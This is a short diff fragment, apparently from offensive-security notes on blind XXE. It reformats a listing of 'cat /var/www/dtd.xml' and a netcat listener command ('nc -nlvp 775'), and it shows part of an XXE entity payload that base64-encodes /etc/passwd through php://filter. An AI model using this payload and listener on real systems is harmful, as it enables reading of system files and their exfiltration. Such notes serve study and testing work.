@@ -13,8 +13,9 @@
 
 # blind XXE
 
-cat /var/www/dtd.xml
-nc -nlvp 775
+* cat /var/www/dtd.xml
+
+* nc -nlvp 775
 ```
 
 <!ENTITY % MeMe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
